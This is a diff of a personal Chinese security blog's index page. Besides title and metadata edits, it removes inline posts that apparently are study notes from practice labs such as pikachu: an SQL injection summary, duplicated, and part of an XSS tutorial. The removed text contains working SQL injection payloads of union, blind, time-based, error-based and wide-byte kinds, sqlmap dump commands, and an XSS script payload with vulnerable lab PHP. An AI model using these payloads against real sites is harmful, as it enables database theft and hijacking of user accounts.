@@ -39,14 +39,6 @@
 
 
 
-  <script>
-  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
-  daovoice('init', {
-      app_id: "f10bbdc2"
-    });
-  daovoice('update');
-  </script>
-
 
 
 
@@ -160,15 +152,20 @@
 
 
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="bleaner">
+  <meta name="description" content="次は现実世界で会おう  そしたらまた  同じように友だちになれるよ。">
+<meta property="og:type" content="website">
+<meta property="og:title" content="热爱 | bleaner">
 <meta property="og:url" content="http://bleaner.club/index.html">
-<meta property="og:site_name" content="bleaner">
+<meta property="og:site_name" content="热爱 | bleaner">
+<meta property="og:description" content="次は现実世界で会おう  そしたらまた  同じように友だちになれるよ。">
 <meta property="og:locale" content="default">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="bleaner">
+<meta name="twitter:title" content="热爱 | bleaner">
+<meta name="twitter:description" content="次は现実世界で会おう  そしたらまた  同じように友だちになれるよ。">
 
 
+
+  <link rel="alternate" href="/./atom.xml" title="热爱 | bleaner" type="application/atom+xml">
 
 
 
@@ -183,7 +180,7 @@
   };
 </script>
 
-  <title>bleaner</title>
+  <title>热爱 | bleaner</title>
   
 
 
@@ -244,14 +241,10 @@
     <div class="custom-logo-site-title">
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">bleaner</span>
+        <span class="site-title">热爱 | bleaner</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
-    
-      
-        <p class="site-subtitle">个人博客</p>
-      
     
   </div>
 
@@ -450,16 +443,16 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://bleaner.club/2020/01/16/Sql注入总结/">
+    <link itemprop="mainEntityOfPage" href="http://bleaner.club/2019/11/22/Sql注入总结/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="y gao">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content="次は现実世界で会おう <br/> そしたらまた <br/> 同じように友だちになれるよ。">
       <meta itemprop="image" content="/images/pikachuu_Alex.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bleaner">
+      <meta itemprop="name" content="热爱 | bleaner">
     </span>
 
     
@@ -470,7 +463,7 @@
           <h1 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2020/01/16/Sql注入总结/" class="post-title-link" itemprop="http://bleaner.club/index.html">Unbenannt</a>
+                <a href="/2019/11/22/Sql注入总结/" class="post-title-link" itemprop="http://bleaner.club/index.html">Sql注入总结</a>
               
             
           </h1>
@@ -495,381 +488,7 @@
                 
               
 
-              <time title="Post created: 2020-01-16 16:12:26 / Updated at: 16:01:53" itemprop="dateCreated datePublished" datetime="2020-01-16T16:12:26+08:00">2020-01-16</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2020/01/16/Sql注入总结/#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2020/01/16/Sql注入总结/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2020/01/16/Sql注入总结/" class="leancloud_visitors" data-flag-title="">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">Views: </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>#Sql注入总结</p>
-<h2 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>1、利用闭合变量报错测试注入点， <code>?id=1’</code>这样说明存在单引号闭合注入<br>2、是否存在注入点，用and语句测试<br><code>?id=1’ and 1=2# ?id=1’ and 1=1#</code><br>3、猜测字段<br><code>?id=1’ order by 3%23</code><br>4、找到页面中数据输入点<br> <code>?id=-1’ union select 1,2,3%23</code><br>5、查数据库<br><code>?id=1’ union select 1,schema_name from information_schema.schemata,3%23</code><br>6、查表<br><code>?id=-1’ union select 1,table_name,3 from information_schema.tables where table_schema=database()%23</code><br>7、查字段<br><code>?id=-1’ union select 1,column_name,3 from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;%23</code><br>8、查数据<br><code>?id=-1’ union select 1,flag,3 from 数据库.表名%23</code></p>
-<h3 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h3><p>1、判断是否存在注入点<br><code>?id=1’ and 1=1%23</code>（返回ture页面）<br><code>?id=1’ and 1=2%23</code> （返回false页面）<br>存在布尔型盲注<br>2、查数据库长度<br><code>id=1’ and (length(database()))&gt;7%23</code>返回ture页面说明长度大于7<br><code>id=1’ and (length(database()))&gt;20%23</code>返回false页面说明长度小于20<br>利用二分法最终确定数据库长度<br>如果id=1’ and (length(database()))=12%23 返回ture说明数据库长度为12<br>3、查数据库<br><code>?id=1’and ascii(substr(database(),2,1))&gt;114%23</code>（对查询的数据取第一位判断）<br>substr(a,b,c)是截取字符函数。a=截取对象 b=截取的位数 c=截取的个数<br>substr(database(),1,1)是取出数据库的第一位的值。<br>4、查表<br><code>?id=1’ and (ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1)))&gt;130%23</code>（利用二分法，ascii为ascii码，例如97=‘a’）<br>7、查列：<br><code>?id=1’ and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=‘表名’ limit 0,1),1,1)))&gt;0%23</code> (如果报错可以加limit 0,1)<br>8、查字段<br><code>?id=1’ and length((select username from 数据库.表名 limit 0,1))&gt;0%23</code></p>
-<p>###延时型<br>是由返回响应的时间判断的。利用此函数sleep（）与if()<br>判断：<br><code>?id=1’ and sleep(5)%23</code><br>响应时间5秒存在延时注入<br>查数据库<br><code>?id=1’and if((ascii(substr(database(),1,1))&gt;114) ,sleep(5),0)%23</code><br>其他操作语法与布尔型一样。</p>
-<h3 id="报错型注入"><a href="#报错型注入" class="headerlink" title="报错型注入"></a>报错型注入</h3><p>基于报错的盲注是通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而是我们得到想要的基本信息——数据库名、版本、用户名等</p>
-<p>1.直接使用报错：<br><code>&#39; union select 1,count(*),concat(&#39;/&#39;,(select database()),&#39;/&#39;,floor(rand(0)*2))a from information_schema.columns group by a--+</code></p>
-<p>这里格式貌似几乎固定，相当于这样输就会出错的bug，count()用来返回有多少条数据这里固定写法，中间select后面是我们要获得的信息，<br>floor(rand(0)*2)也是固定写法，floor用来取不大于括号里的最大整数，比如1.5取1，后面的a和最后的a只要是相等的字符就可以，注意返回值不能超过一行，如果多行数据加limit<br>2.利用xpath函数-extractvalue报错<br>payload：<br><code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</code></p>
-<p>这也是一种类似bug的固定写法，extractvalue，concat里面第一个必须是0x7e，后面是要查的内容，concat里面可以放很多参数（参见目录），所以可以多查很多数据，如<br><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e,user()))--+</code><br>3.利用xpath函数—updatexml报错：<br>payload:<br><code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code></p>
-<p>与extractvalue同理，这里不再赘述</p>
-<p>###宽字节注入<br>测试<br>?id=1’ and 1=2%23 没反应<br>?id=1’ %df’ and 1=2%23 页面返回假。说明存在宽字节注入<br>后面与前面语法一样。不过都得?id=1’ %df’ 有%df进行注入</p>
-<p>##sqlmap使用</p>
-<h3 id="get方式"><a href="#get方式" class="headerlink" title="get方式"></a>get方式</h3><p>查所有数据库<br><code>Sqlmap -u “url” --dbs</code><br>当前数据库<br><code>Sqlmap -u “url” --current-db</code><br>表<br><code>Sqlmap -u “url” -D 数据库 --tables</code><br>列<br><code>Sqlmap -u “url” -D 数据库 -T 表名 --columns</code><br>字段<br><code>Sqlmap -u “url” -D 数据库 -T 表名 -C 列名1，列名2 --dump</code></p>
-<h3 id="post方式"><a href="#post方式" class="headerlink" title="post方式"></a>post方式</h3><p>1.先用burp抓包，如下<br><img src="./1579160162571.png" alt="Alt text"><br>将数据包copy to file<br>保存到”C:\Users\Administrator\Desktop\1.txt”<br>2.python sqlmap.py -r “请求包的路径” -p “注入点”<br>查所有数据库<br><code>Sqlmap -r “c://windows/web/1.txt” -p id --dbs (-r为保存的txt文件路径，-p为存在注入的参数，这里是id)</code><br>当前数据库<br><code>Sqlmap -r “c://windows/web/1.txt” -p id --current-db</code><br>查所有表<br><code>Sqlmap -r “c://windows/web/1.txt” -p id -D 数据库 --tables</code><br>列<br><code>Sqlmap -r “c://windows/web/1.txt” -p id -D 数据库 -T 表名 --columns</code><br>字段<br><code>Sqlmap -r “c://windows/web/1.txt” -p id -D 数据库 -T 表名 -C 列名1，列名2 --dump</code></p>
-<p>第二种方法<br>如post id=1存在注入<br>sqlmap -u“url”–data=“id=1”</p>
-<p>第三种方法<br>在表单中，例如登陆页面，如果不知道那个参数存在注入<br>sqlmap.py -u “url” –forms<br>然后一直点y即可。</p>
-<h3 id="http头部注入"><a href="#http头部注入" class="headerlink" title="http头部注入"></a>http头部注入</h3><p>referrer头<br>sqlmap -u “url” –dbs –level 3<br>(可能要跑很久</p>
-<p>host头<br>sqlmap -u “url” –dbs –level 5</p>
-<p>user-agent<br>sqlmap -u “url” –user-agent –dbs –level 3</p>
-<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>sqlmap -u “url?id=1%df’”</p>
-
-          
-        
-      
-    </div>
-    <div>
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    <div>
-          
-    </div>
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://bleaner.club/2020/01/16/Sql注入总结/Sql注入总结/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="y gao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/pikachuu_Alex.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bleaner">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/01/16/Sql注入总结/Sql注入总结/" class="post-title-link" itemprop="http://bleaner.club/index.html">Unbenannt</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2020-01-16 16:01:52 / Updated at: 16:01:53" itemprop="dateCreated datePublished" datetime="2020-01-16T16:01:52+08:00">2020-01-16</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2020/01/16/Sql注入总结/Sql注入总结/#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2020/01/16/Sql注入总结/Sql注入总结/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2020/01/16/Sql注入总结/Sql注入总结/" class="leancloud_visitors" data-flag-title="">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">Views: </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>#Sql注入总结</p>
-<h2 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>1、利用闭合变量报错测试注入点， <code>?id=1’</code>这样说明存在单引号闭合注入<br>2、是否存在注入点，用and语句测试<br><code>?id=1’ and 1=2# ?id=1’ and 1=1#</code><br>3、猜测字段<br><code>?id=1’ order by 3%23</code><br>4、找到页面中数据输入点<br> <code>?id=-1’ union select 1,2,3%23</code><br>5、查数据库<br><code>?id=1’ union select 1,schema_name from information_schema.schemata,3%23</code><br>6、查表<br><code>?id=-1’ union select 1,table_name,3 from information_schema.tables where table_schema=database()%23</code><br>7、查字段<br><code>?id=-1’ union select 1,column_name,3 from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;%23</code><br>8、查数据<br><code>?id=-1’ union select 1,flag,3 from 数据库.表名%23</code></p>
-<h3 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h3><p>1、判断是否存在注入点<br><code>?id=1’ and 1=1%23</code>（返回ture页面）<br><code>?id=1’ and 1=2%23</code> （返回false页面）<br>存在布尔型盲注<br>2、查数据库长度<br><code>id=1’ and (length(database()))&gt;7%23</code>返回ture页面说明长度大于7<br><code>id=1’ and (length(database()))&gt;20%23</code>返回false页面说明长度小于20<br>利用二分法最终确定数据库长度<br>如果id=1’ and (length(database()))=12%23 返回ture说明数据库长度为12<br>3、查数据库<br><code>?id=1’and ascii(substr(database(),2,1))&gt;114%23</code>（对查询的数据取第一位判断）<br>substr(a,b,c)是截取字符函数。a=截取对象 b=截取的位数 c=截取的个数<br>substr(database(),1,1)是取出数据库的第一位的值。<br>4、查表<br><code>?id=1’ and (ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1)))&gt;130%23</code>（利用二分法，ascii为ascii码，例如97=‘a’）<br>7、查列：<br><code>?id=1’ and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=‘表名’ limit 0,1),1,1)))&gt;0%23</code> (如果报错可以加limit 0,1)<br>8、查字段<br><code>?id=1’ and length((select username from 数据库.表名 limit 0,1))&gt;0%23</code></p>
-<p>###延时型<br>是由返回响应的时间判断的。利用此函数sleep（）与if()<br>判断：<br><code>?id=1’ and sleep(5)%23</code><br>响应时间5秒存在延时注入<br>查数据库<br><code>?id=1’and if((ascii(substr(database(),1,1))&gt;114) ,sleep(5),0)%23</code><br>其他操作语法与布尔型一样。</p>
-<h3 id="报错型注入"><a href="#报错型注入" class="headerlink" title="报错型注入"></a>报错型注入</h3><p>基于报错的盲注是通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而是我们得到想要的基本信息——数据库名、版本、用户名等</p>
-<p>1.直接使用报错：<br><code>&#39; union select 1,count(*),concat(&#39;/&#39;,(select database()),&#39;/&#39;,floor(rand(0)*2))a from information_schema.columns group by a--+</code></p>
-<p>这里格式貌似几乎固定，相当于这样输就会出错的bug，count()用来返回有多少条数据这里固定写法，中间select后面是我们要获得的信息，<br>floor(rand(0)*2)也是固定写法，floor用来取不大于括号里的最大整数，比如1.5取1，后面的a和最后的a只要是相等的字符就可以，注意返回值不能超过一行，如果多行数据加limit<br>2.利用xpath函数-extractvalue报错<br>payload：<br><code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</code></p>
-<p>这也是一种类似bug的固定写法，extractvalue，concat里面第一个必须是0x7e，后面是要查的内容，concat里面可以放很多参数（参见目录），所以可以多查很多数据，如<br><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e,user()))--+</code><br>3.利用xpath函数—updatexml报错：<br>payload:<br><code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code></p>
-<p>与extractvalue同理，这里不再赘述</p>
-<p>###宽字节注入<br>测试<br>?id=1’ and 1=2%23 没反应<br>?id=1’ %df’ and 1=2%23 页面返回假。说明存在宽字节注入<br>后面与前面语法一样。不过都得?id=1’ %df’ 有%df进行注入</p>
-<p>##sqlmap使用</p>
-<h3 id="get方式"><a href="#get方式" class="headerlink" title="get方式"></a>get方式</h3><p>查所有数据库<br><code>Sqlmap -u “url” --dbs</code><br>当前数据库<br><code>Sqlmap -u “url” --current-db</code><br>表<br><code>Sqlmap -u “url” -D 数据库 --tables</code><br>列<br><code>Sqlmap -u “url” -D 数据库 -T 表名 --columns</code><br>字段<br><code>Sqlmap -u “url” -D 数据库 -T 表名 -C 列名1，列名2 --dump</code></p>
-<h3 id="post方式"><a href="#post方式" class="headerlink" title="post方式"></a>post方式</h3><p>1.先用burp抓包，如下<br><img src="./1579160162571.png" alt="Alt text"><br>将数据包copy to file<br>保存到”C:\Users\Administrator\Desktop\1.txt”<br>2.python sqlmap.py -r “请求包的路径” -p “注入点”<br>查所有数据库<br><code>Sqlmap -r “c://windows/web/1.txt” -p id --dbs (-r为保存的txt文件路径，-p为存在注入的参数，这里是id)</code><br>当前数据库<br><code>Sqlmap -r “c://windows/web/1.txt” -p id --current-db</code><br>查所有表<br><code>Sqlmap -r “c://windows/web/1.txt” -p id -D 数据库 --tables</code><br>列<br><code>Sqlmap -r “c://windows/web/1.txt” -p id -D 数据库 -T 表名 --columns</code><br>字段<br><code>Sqlmap -r “c://windows/web/1.txt” -p id -D 数据库 -T 表名 -C 列名1，列名2 --dump</code></p>
-<p>第二种方法<br>如post id=1存在注入<br>sqlmap -u“url”–data=“id=1”</p>
-<p>第三种方法<br>在表单中，例如登陆页面，如果不知道那个参数存在注入<br>sqlmap.py -u “url” –forms<br>然后一直点y即可。</p>
-<h3 id="http头部注入"><a href="#http头部注入" class="headerlink" title="http头部注入"></a>http头部注入</h3><p>referrer头<br>sqlmap -u “url” –dbs –level 3<br>(可能要跑很久</p>
-<p>host头<br>sqlmap -u “url” –dbs –level 5</p>
-<p>user-agent<br>sqlmap -u “url” –user-agent –dbs –level 3</p>
-<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>sqlmap -u “url?id=1%df’”</p>
-
-          
-        
-      
-    </div>
-    <div>
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    <div>
-          
-    </div>
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://bleaner.club/2019/10/23/xss跨站脚本攻击/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="y gao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/pikachuu_Alex.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bleaner">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/10/23/xss跨站脚本攻击/" class="post-title-link" itemprop="http://bleaner.club/index.html">xss跨站脚本攻击</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2019-10-23 18:42:38" itemprop="dateCreated datePublished" datetime="2019-10-23T18:42:38+08:00">2019-10-23</time>
+              <time title="Post created: 2019-11-22 00:00:00" itemprop="dateCreated datePublished" datetime="2019-11-22T00:00:00+08:00">2019-11-22</time>
             
 
             
@@ -886,7 +505,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-11-17 00:36:56" itemprop="dateModified" datetime="2019-11-17T00:36:56+08:00">2019-11-17</time>
+                <time title="Updated at: 2020-03-16 22:37:33" itemprop="dateModified" datetime="2020-03-16T22:37:33+08:00">2020-03-16</time>
               
             
           </span>
@@ -903,7 +522,7 @@
                 <span class="post-meta-item-text">in</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Web安全漏洞/" itemprop="url" rel="index"><span itemprop="name">Web安全漏洞</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/知识总结/" itemprop="url" rel="index"><span itemprop="name">知识总结</span></a></span>
 
                 
                 
@@ -918,8 +537,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/10/23/xss跨站脚本攻击/#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/10/23/xss跨站脚本攻击/" itemprop="commentCount"></span>
+                <a href="/2019/11/22/Sql注入总结/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/11/22/Sql注入总结/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -927,7 +546,7 @@
 
           
           
-             <span id="/2019/10/23/xss跨站脚本攻击/" class="leancloud_visitors" data-flag-title="xss跨站脚本攻击">
+             <span id="/2019/11/22/Sql注入总结/" class="leancloud_visitors" data-flag-title="Sql注入总结">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -960,234 +579,17 @@
       
         
           
-            <h2 id="xss跨站脚本攻击"><a href="#xss跨站脚本攻击" class="headerlink" title="xss跨站脚本攻击"></a>xss跨站脚本攻击</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><p>跨站脚本（cross site script）为了避免与样式css混淆，所以简称为XSS。<br>XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。那么什么是XSS呢？<br>XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。<br>从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。<br>XSS攻击的危害包括：<br>1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号<br>2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力<br>3、盗窃企业重要的具有商业价值的资料<br>4、非法转账<br>5、强制发送电子邮件<br>6、网站挂马<br>7、控制受害者机器向其它网站发起攻击</p>
-<hr>
-<h3 id="2-原因解析"><a href="#2-原因解析" class="headerlink" title="2.原因解析"></a>2.原因解析</h3><p><strong>主要原因</strong>：过于信任客户端提交的数据！<br><strong>解决办法</strong>：不信任任何客户端提交的数据，只要是客户端提交的数据就应该先进行相应的过滤处理然后方可进行下一步的操作。<br><strong>进一步分析细节：</strong>　　<br>客户端提交的数据本来就是应用所需要的，但是恶意攻击者利用网站对客户端提交数据的信任，在数据中插入一些符号以及javascript代码，那么这些数据将会成为应用代码中的一部分了。那么攻击者就可以肆无忌惮地展开攻击啦。　　<br>因此我们绝不可以信任任何客户端提交的数据！！！</p>
-<hr>
-<h3 id="3-xss分类"><a href="#3-xss分类" class="headerlink" title="3.xss分类"></a>3.xss分类</h3><p>一般XSS可以分为如下几种常见类型：<br>1.反射性XSS: 经过后端，不经过数据库<br>2.存储型XSS:  经过后端，经过数据库<br>3.DOM型XSS: 不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。</p>
-<h4 id="3-1反射型xss"><a href="#3-1反射型xss" class="headerlink" title="3.1反射型xss:"></a>3.1反射型xss:</h4><p>　又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</p>
-<h5 id="3-1-1get请求下的xss"><a href="#3-1-1get请求下的xss" class="headerlink" title="3.1.1get请求下的xss"></a>3.1.1get请求下的xss</h5><p>1.测试输入特殊字符<br><img src="./1559442902681.png" alt="Alt text"><br>2.查看网页源代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;p class=&apos;notice&apos;&gt;who is 1111&quot;&quot;&lt;&gt;&apos;&apos;(),idon&apos;t care!&lt;/p&gt;            &lt;/div&gt;</span><br></pre></td></tr></table></figure>
-<p>3.写payload<br>猜测是该网站是直接将输入的内容显示到who is后边，所以可以直接写javascript脚本<br>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>提交时发现了一点问题<br><img src="./1559462193536.png" alt="Alt text"><br>即已经做了防xss的措施，只不过是在前端完成的，简单修改一下maxlength的值就好啦~<br>输入后浏览器弹出xss对话框，达成预期目标<br><img src="./1559462330659.png" alt="Alt text"><br>攻击时直接发送链接就好了<br><a href="http://127.0.0.1:801/pikachu-master/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E&amp;submit=submit" target="_blank" rel="noopener">http://127.0.0.1:801/pikachu-master/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E&amp;submit=submit</a><br>接收者接收消息显示的时候将会弹出警告窗口</p>
-<h5 id="3-1-2post请求的xss"><a href="#3-1-2post请求的xss" class="headerlink" title="3.1.2post请求的xss"></a>3.1.2post请求的xss</h5><p>输入内容通过post表单提交<br>burp抓包分析<br><img src="./1559483706392.png" alt="Alt text"><br>URL中没有要提交的信息，所以不能直接通过发送链接攻击。</p>
-<hr>
-<p><strong>反射型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 浏览器。</strong></p>
-<h3 id="3-2存储型xss"><a href="#3-2存储型xss" class="headerlink" title="3.2存储型xss"></a>3.2存储型xss</h3><p>后台源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$link=connect();</span><br><span class="line">$html=&apos;&apos;;</span><br><span class="line">if(array_key_exists(&quot;message&quot;,$_POST) &amp;&amp; $_POST[&apos;message&apos;]!=null)&#123;</span><br><span class="line">    $message=escape($link, $_POST[&apos;message&apos;]);</span><br><span class="line">    $query=&quot;insert into message(content,time) values(&apos;$message&apos;,now())&quot;;</span><br><span class="line">    $result=execute($link, $query);</span><br><span class="line">    if(mysqli_affected_rows($link)!=1)&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;数据库出现异常，提交失败！&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>用户输入的内容还是没有过滤，但是不直接显示在页面中，而是插入到了数据库。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo $html;</span><br><span class="line">$query=&quot;select * from message&quot;;</span><br><span class="line">$result=execute($link, $query);</span><br><span class="line">while($data=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">	echo &quot;&lt;p class=&apos;con&apos;&gt;&#123;$data[&apos;content&apos;]&#125;&lt;/p&gt;&lt;a href=&apos;xss_stored.php?id=&#123;$data[&apos;id&apos;]&#125;&apos;&gt;删除&lt;/a&gt;&quot;;</span><br><span class="line"> &#125;</span><br><span class="line">echo $html;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>  再由php代码输出到前端</p>
-<hr>
